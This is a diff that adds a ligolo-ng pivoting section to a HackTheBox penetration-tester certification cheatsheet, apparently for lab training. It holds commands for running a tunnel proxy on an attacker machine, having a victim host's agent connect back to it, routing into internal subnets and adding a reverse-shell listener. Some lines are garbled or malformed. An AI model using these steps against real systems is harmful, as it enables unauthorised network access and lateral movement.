@@ -63,6 +63,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
     - [SOCKS5 Tunneling with Chisel](#SOCKS5-Tunneling-with-Chisel)
     - [ICMP Tunneling with SOCKS](#ICMP-Tunneling-with-SOCKS)
     - [RDP and SOCKS Tunneling with SocksOverRDP](#RDP-and-SOCKS-Tunneling-with-SocksOverRDP)
+    - [Pivoting with ligolo-ng](#Pivoting-with-ligolo-ng)
 - [Active Directory](#active-directory)
     - [Initial Enumeration](#initial-enumeration)
     - [LLMNR/NTB-NS Poisoning](#llmnr-poisoning)
@@ -1116,7 +1117,48 @@ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
 ##### RDP and SOCKS Tunneling with SocksOverRDP
 ```
 # Windows-based command used to register the SocksOverRDP-PLugin.dll. (https://github.com/nccgroup/SocksOverRDP)
-regsvr32.exe SocksOverRDP-Plugin.dll
+regsvr32.exe SocksOverRDP-Plugin.dll   
+```
+##### Pivoting with ligolo-ng
+```
+# Download Proxy and  Agent of ligolo-ng .  (https://github.com/nicocha30/ligolo-ng)
+
+mkdir ligolo && cd ligolo
+(Download Proxy  for Linux)
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
+tar -xvf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
+
+(Download Agent  for Linux)
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip
+unzip ligolo-ng_agent_0.8.2_windows_amd64.zip
+
+# Configure the TUN Interface on the attacker's machine.
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+
+# Run a proxy on the attacker's machine.
+./proxy -laddr 0.0.0.0:11601 -selfcert
+
+# Run the Agent on the victim's machine (Pivot Host).
+agent.exe -connect 10.10.14.18:11601 -ignore-cert
+
+# Activate Tunnel on the Proxy interface.  ( run in proxy)
+session       (Display a list of all connected agents.)
+ifconfig      (Check the victim's network cards and IP addresses)
+use <ID>      (Select the specific Agent to work with.)
+id            (View information about the user running the agent)
+listener_list (Listing listener have add )
+start
+kill          (Disconnect a specific agent)
+
+# Add a route on the attacker's machine.
+sudo ip route add 172.16.5.0/24 dev ligolo    (done)         ( run in hacer shell)
+ 
+# Setting Reverse Shell in proxy
+listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:1234 --tcp   ( run in proxy)
+
+# setting to Access the Agent's own Localhost.
+sudo ip route add 240.0.0.1/32 dev1 ligolo                   ( run in hacer shell)
 ```
 ## Active Directory
 
